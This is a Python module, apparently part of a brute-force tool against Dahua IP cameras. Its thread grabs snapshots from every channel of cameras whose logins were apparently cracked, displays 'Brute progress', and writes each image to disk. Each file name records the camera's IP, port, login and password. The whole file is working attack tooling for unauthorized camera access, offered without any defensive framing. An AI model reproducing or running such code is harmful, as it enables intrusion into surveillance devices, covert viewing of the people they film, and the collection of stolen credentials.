# -*- coding:utf-8 -*-
import io
import logging
import queue
import sys
import threading
from pathlib import PurePath
from time import sleep

import config
from paint import *


class ScreenshotThread(threading.Thread):
    def __init__(self, screenshot_queue):
        threading.Thread.__init__(self)
        self.screenshot_queue = screenshot_queue

    def run(self):
        while True:
            dahua = self.screenshot_queue.get()
            if config.snapshots_enabled:
                self.make_snapshots(dahua)
            self.screenshot_queue.task_done()

    def make_snapshots(self, dahua):
        logging.debug(f'Make snapshot from {dahua.ip} (DM: {dahua.model}, channels: {dahua.channels_count})')
        dead_counter = 0
        total_channels = config.ch_count

        for channel in range(dahua.channels_count):
            if dead_counter > 4:
                logging.debug(f'{dead_counter} dead channels in a row. Skipping this cam')
                break
                
            try:
                snapshot = dahua.get_snapshot(channel)
            except Exception as e:
                logging.debug(f'Channel {channel + 1} of {dahua.ip} is dead: {str(e)}')
                dead_counter += 1
                continue
            dead_counter = 0
            
            print(fore_green(f'Brute progress: [{config.state}] Grabbing snapshots for {dahua.ip}.. \n')
                + back_yellow(f'Writing snapshots.. Total saved {config.snapshots_counts} from {total_channels}'), end='\r')
            sleep(0.05)

            name = f"{dahua.ip}_{dahua.port}_{dahua.login}_{dahua.password}_{channel + 1}_{dahua.model}.jpg"
            try:
                self.save_image(name, snapshot)
            except Exception as e:
                logging.debug(f'{fore_red(f"Cannot save snapshot: {str(e)}")}')
            
        logging.debug(f'{dahua.ip} exit from make_snapshots()')

    def save_image(self, name, image_bytes):
        try:
            with open(PurePath(config.snapshots_folder, name), 'wb') as outfile:
                outfile.write(image_bytes)
            config.snapshots_counts += 1
            logging.debug(f'{fore_green(f"Saved snapshot - {name}")}')
        except Exception as e:
            logging.debug(f'{fore_red(f"Cannot save snapshot - {name}:")} {back_red(f"{str(e)}")}')
